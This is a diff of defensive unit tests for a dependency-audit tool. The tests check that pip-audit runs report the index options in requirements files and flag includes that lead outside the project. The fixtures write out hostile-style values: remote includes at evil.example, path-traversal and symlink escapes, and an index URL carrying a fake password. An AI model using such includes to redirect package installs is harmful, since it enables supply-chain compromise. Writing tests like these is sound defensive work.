@@ -11,6 +11,7 @@ import {
   existsSync,
   mkdirSync,
   readFileSync,
+  symlinkSync,
   writeFileSync,
 } from 'node:fs';
 import { dirname, join, resolve } from 'node:path';
@@ -154,6 +155,46 @@ describe('scan_deps', () => {
     expect(r.manifest_coverage_gaps).toEqual([{ ecosystem: 'dotnet', files: ['Test.csproj'] }]);
     expect(Object.values(r.findings_count_by_severity).reduce((a, b) => a + b, 0)).toBe(0);
     expect(r.coverage).not.toBe('full');
+  });
+
+  // Review 3.0, wave 2 (c): Trivy skips devDependencies by default, so a
+  // package.json with only those, beside a committed lock, gets no Result —
+  // and the warning told the user to commit the lock file they had.
+  it.each([
+    ['only devDependencies beside a committed lock', true],
+    ['dependencies and no lock file at all', false],
+  ])('a package.json with %s: the advice fits the case', async (_label, devOnly) => {
+    const project = tempProject();
+    if (devOnly) {
+      writeFileSync(join(project, 'package.json'), '{"name":"x","devDependencies":{"lodash":"4.17.4"}}', 'utf8');
+      writeFileSync(join(project, 'package-lock.json'), '{"lockfileVersion":3}', 'utf8');
+    } else {
+      writeFileSync(join(project, 'package.json'), '{"name":"x","dependencies":{"lodash":"4.17.4"}}', 'utf8');
+    }
+    const plugin = makePlugin(project);
+    vi.mocked(scannerAvailable).mockResolvedValue('/fake/bin/trivy');
+    vi.mocked(runProcess).mockImplementation(async (opts) => {
+      const path = outputPathFor(opts.args);
+      if (path) writeFileSync(path, trivyNoResultsFx(), 'utf8');
+      return { outcome: 'completed' as const, exitCode: 0, stdout: '', stderr: '', truncated: false };
+    });
+    const r = (await getTool('scan_deps').handler({ project_path: project }, plugin)) as {
+      ok: true;
+      coverage: string;
+      warnings: string[];
+      manifest_coverage_gaps: Array<{ ecosystem: string; files: string[]; dev_only?: string[] }>;
+    };
+    expect(r.coverage).toBe('none');
+    const warning = r.warnings.find((w) => w.includes('NOTHING was scanned')) ?? '';
+    if (devOnly) {
+      expect(r.manifest_coverage_gaps).toEqual([{ ecosystem: 'npm', files: ['package.json'], dev_only: ['package.json'] }]);
+      expect(warning).toContain('npm (package.json): only devDependencies, which Trivy skips by default');
+      expect(warning).not.toMatch(/commit the lock file/);
+    } else {
+      expect(r.manifest_coverage_gaps).toEqual([{ ecosystem: 'npm', files: ['package.json'] }]);
+      expect(warning).toContain('npm (package.json): commit the lock file your package manager writes');
+      expect(warning).not.toMatch(/devDependencies/);
+    }
   });
 
   it('item 4: a PARTIAL manifest gap (npm covered, dotnet not) never puts the bare "trivy" name in missing_tools', async () => {
@@ -970,6 +1011,189 @@ describe('deps_audit', () => {
     // hardcoded 'requirements.txt' for the requirements/dev.txt call.
     expect(filePaths.has('requirements.txt')).toBe(true);
     expect([...filePaths].some((p) => p?.includes('dev.txt'))).toBe(true);
+  });
+
+  // Review 3.0, wave 2 (b): a requirements file can carry pip's index
+  // options, and pip-audit installs `-r` requirements with pip, which honours
+  // them — so the file decides which index the audited versions come from,
+  // as `.npmrc` decides which registry answers npm audit. Honoured (a private
+  // index is legitimate), never silently.
+  describe('pip-audit: index options in a requirements file are named', () => {
+    async function pipAuditRun(project: string) {
+      const plugin = makePlugin(project);
+      vi.mocked(scannerAvailable).mockImplementation(async (name: string) =>
+        name === 'pip-audit' ? '/fake/bin/pip-audit' : null,
+      );
+      vi.mocked(runProcess).mockImplementation(async (opts) => {
+        if (opts.command === 'pip-audit') {
+          const path = outputPathFor(opts.args);
+          if (path) writeFileSync(path, pipAuditFx(), 'utf8');
+        }
+        return { outcome: 'completed' as const, exitCode: 0, stdout: '', stderr: '', truncated: false };
+      });
+      const r = (await getTool('deps_audit').handler({ project_path: project }, plugin)) as {
+        ok: true;
+        tools_run: { name: string; status: string; reason?: string; honoured_config?: string[] }[];
+      };
+      return r.tools_run.find((t) => t.name === 'pip-audit');
+    }
+
+    it('names every requirements file pip-audit read whose index options steer it — an included one too', async () => {
+      const project = tempProject();
+      writeFileSync(
+        join(project, 'requirements.txt'),
+        '--index-url https://ci:s3cret@pypi.example.internal/simple\ndjango==2.0.1\n',
+        'utf8',
+      );
+      writeFileSync(
+        join(project, 'requirements-dev.txt'),
+        '# dev\n--extra-index-url https://extra.example/simple\n-r common/base.txt\nrequests==2.20.0\n',
+        'utf8',
+      );
+      mkdirSync(join(project, 'common'));
+      writeFileSync(join(project, 'common', 'base.txt'), '-i https://third.example/simple\nflask==1.0\n', 'utf8');
+      mkdirSync(join(project, 'requirements'));
+      writeFileSync(join(project, 'requirements', 'test.txt'), 'pytest==7.0.0\n', 'utf8');
+
+      const run = await pipAuditRun(project);
+      expect(run?.status).toBe('ok');
+      expect(run?.honoured_config).toEqual(['common/base.txt', 'requirements-dev.txt', 'requirements.txt']);
+      expect(run?.reason).toMatch(
+        /honoured the project's common\/base\.txt, requirements-dev\.txt, requirements\.txt \(its package-index options decide which index pip-audit's resolution installs from\)/,
+      );
+      expect(run?.reason).not.toContain('s3cret');
+    });
+
+    it.each([
+      ['--index-url=https://x.example/simple'],
+      ['  -i https://x.example/simple'],
+      ['-ihttps://x.example/simple'],
+      ['--extra-index-url https://x.example/simple'],
+      ['--find-links ./wheels'],
+      ['-f https://x.example/wheels/'],
+      ['--no-index'],
+      ['--trusted-host x.example'],
+    ])('names a requirements file holding `%s`', async (line) => {
+      const project = tempProject();
+      writeFileSync(join(project, 'requirements.txt'), `${line}\ndjango==2.0.1\n`, 'utf8');
+      const run = await pipAuditRun(project);
+      expect(run?.honoured_config).toEqual(['requirements.txt']);
+    });
+
+    it.each([
+      ['no option at all', 'django==2.0.1\n'],
+      ['an index option in a comment', '# --index-url https://x.example/simple\ndjango==2.0.1\n'],
+      ['a per-requirement hash', 'django==2.0.1 --hash=sha256:0000000000000000000000000000000000000000000000000000000000000000\n'],
+      ['an include with no index option', '-r base.txt\ndjango==2.0.1\n'],
+      // pip fails on a missing include: it cannot steer anything.
+      ['an include that is not there', '-r missing.txt\ndjango==2.0.1\n'],
+    ])('names nothing for %s', async (_label, text) => {
+      const project = tempProject();
+      writeFileSync(join(project, 'requirements.txt'), text, 'utf8');
+      writeFileSync(join(project, 'base.txt'), 'flask==1.0\n', 'utf8');
+      const run = await pipAuditRun(project);
+      expect(run?.status).toBe('ok');
+      expect(run?.honoured_config).toBeUndefined();
+      expect(run?.reason ?? '').not.toMatch(/honoured|not read by dev-guardian/);
+    });
+
+    /**
+     * Review 3.0, wave 2, round 2: an include pip follows but the server
+     * does not read (it reads within the project) was not named, so one line
+     * — `-r https://evil.example/r.txt` — picked pip-audit's index in
+     * silence. Every such include is named now, unread.
+     */
+    function outsideProject(): { project: string; outside: string } {
+      const outside = makeTempDir('deps-tools-outside-');
+      writeFileSync(join(outside, 'idx.txt'), '--index-url https://outside.example/simple\n', 'utf8');
+      const project = join(outside, 'project');
+      mkdirSync(project);
+      symlinkSync(outside, join(project, 'link'), 'junction');
+      return { project, outside };
+    }
+
+    it.each([
+      ['a path out of the project', '../idx.txt'],
+      ['a path further out', '../../outside/evil.txt'],
+      ['a URL', 'https://evil.example/r.txt'],
+      ['a link out of the project', 'link/idx.txt'],
+      ['an environment variable', '${REQS_DIR}/base.txt'],
+    ])('names an include it cannot read: %s', async (_label, target) => {
+      const { project } = outsideProject();
+      writeFileSync(join(project, 'requirements.txt'), `-r ${target}\ndjango==2.0.1\n`, 'utf8');
+      const run = await pipAuditRun(project);
+      expect(run?.status).toBe('ok');
+      expect(run?.reason).toContain(
+        `requirements.txt includes ${target} (not read by dev-guardian): pip may take its index from it`,
+      );
+      expect(run?.honoured_config).toEqual(['requirements.txt']);
+    });
+
+    it('names a constraints include, an --option=value spelling, and one found in an included file', async () => {
+      const { project } = outsideProject();
+      mkdirSync(join(project, 'sub'));
+      writeFileSync(
+        join(project, 'requirements.txt'),
+        '-c https://evil.example/c.txt\n--requirement=$HOME/r.txt\n-r sub/base.txt\n',
+        'utf8',
+      );
+      writeFileSync(join(project, 'sub', 'base.txt'), '-r https://evil.example/nested.txt\nflask==1.0\n', 'utf8');
+      const run = await pipAuditRun(project);
+      const reason = run?.reason ?? '';
+      expect(reason).toContain('requirements.txt includes https://evil.example/c.txt (not read by dev-guardian)');
+      expect(reason).toContain('requirements.txt includes $HOME/r.txt (not read by dev-guardian)');
+      expect(reason).toContain('sub/base.txt includes https://evil.example/nested.txt (not read by dev-guardian)');
+      expect(run?.honoured_config).toEqual(['requirements.txt', 'sub/base.txt']);
+    });
+
+    // A `requirements/` that links out of the project is neither listed nor
+    // handed to pip-audit — and that is a gap, named, never a silent skip.
+    it('names a requirements/ that leads out of the project as not audited, and coverage is partial', async () => {
+      const { project, outside } = outsideProject();
+      mkdirSync(join(outside, 'reqs'));
+      writeFileSync(join(outside, 'reqs', 'base.txt'), '--index-url https://outside.example/simple\n', 'utf8');
+      symlinkSync(join(outside, 'reqs'), join(project, 'requirements'), 'junction');
+      writeFileSync(join(project, 'requirements.txt'), 'django==2.0.1\n', 'utf8');
+      const commands: string[][] = [];
+      const plugin = makePlugin(project);
+      vi.mocked(scannerAvailable).mockImplementation(async (name: string) =>
+        name === 'pip-audit' ? '/fake/bin/pip-audit' : null,
+      );
+      vi.mocked(runProcess).mockImplementation(async (opts) => {
+        if (opts.command === 'pip-audit') {
+          commands.push(opts.args ?? []);
+          const path = outputPathFor(opts.args);
+          if (path) writeFileSync(path, pipAuditFx(), 'utf8');
+        }
+        return { outcome: 'completed' as const, exitCode: 0, stdout: '', stderr: '', truncated: false };
+      });
+      const r = (await getTool('deps_audit').handler({ project_path: project }, plugin)) as {
+        ok: true;
+        coverage: string;
+        missing_tools: string[];
+        tools_run: { name: string; status: string; reason?: string; honoured_config?: string[] }[];
+      };
+      const run = r.tools_run.find((t) => t.name === 'pip-audit');
+      expect(run?.status).toBe('ok');
+      expect(run?.reason).toContain('requirements/ leads out of the project: not read or audited by dev-guardian');
+      expect(run?.honoured_config).toBeUndefined();
+      expect(commands.flat().some((a) => a.includes('base.txt'))).toBe(false);
+      expect(r.missing_tools.filter((t) => t === 'pip-audit')).toHaveLength(1);
+      expect(r.coverage).toBe('partial');
+    });
+
+    it('names a requirements file that leads out of the project when it is the only candidate', async (ctx) => {
+      const { project, outside } = outsideProject();
+      writeFileSync(join(outside, 'reqs.txt'), 'django==2.0.1\n', 'utf8');
+      try {
+        symlinkSync(join(outside, 'reqs.txt'), join(project, 'requirements.txt'), 'file');
+      } catch {
+        ctx.skip(); // a file symlink needs privilege on Windows; the directory case above runs everywhere
+      }
+      const run = await pipAuditRun(project);
+      expect(run?.status).toBe('skipped');
+      expect(run?.reason).toBe('requirements.txt leads out of the project: not read or audited by dev-guardian');
+    });
   });
 
   it('runs dotnet SCA for a bare .csproj Trivy could not cover, restoring first', async () => {
